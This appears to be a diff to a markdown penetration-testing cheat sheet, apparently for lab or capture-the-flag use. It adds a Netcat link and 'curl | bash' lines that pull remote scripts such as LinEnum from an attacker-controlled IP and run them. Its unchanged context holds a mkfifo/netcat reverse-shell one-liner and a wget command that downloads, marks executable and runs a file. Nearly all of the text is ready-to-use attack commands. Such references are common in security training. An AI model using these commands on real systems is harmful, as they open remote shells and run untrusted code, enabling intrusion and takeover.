@@ -23,6 +23,7 @@
 - [Hydra](tool/hydra.md)
 - [John the Ripper](tool/john.md)
 - [Hashcat](tool/hashcat.md)
+- [Netcat](tool/netcat.md)
 
 ## Workflow by service
 - [SSH](service/ssh.md)
@@ -39,14 +40,21 @@
 echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.4.49.251 4444 >/tmp/f" > shell.sh
 ```
 
-### Download local file
+### Download file
 ```
 FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; sh /tmp/$FILE
 ```
+```
+curl 10.10.14.7/[FILE] | bash
+```
 
 ### LinEnum
+
 ```
 wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; /tmp/LinEnum.sh
+```
+```
+curl 10.10.14.7/LinEnum.sh | bash
 ```
 
 ### Socat
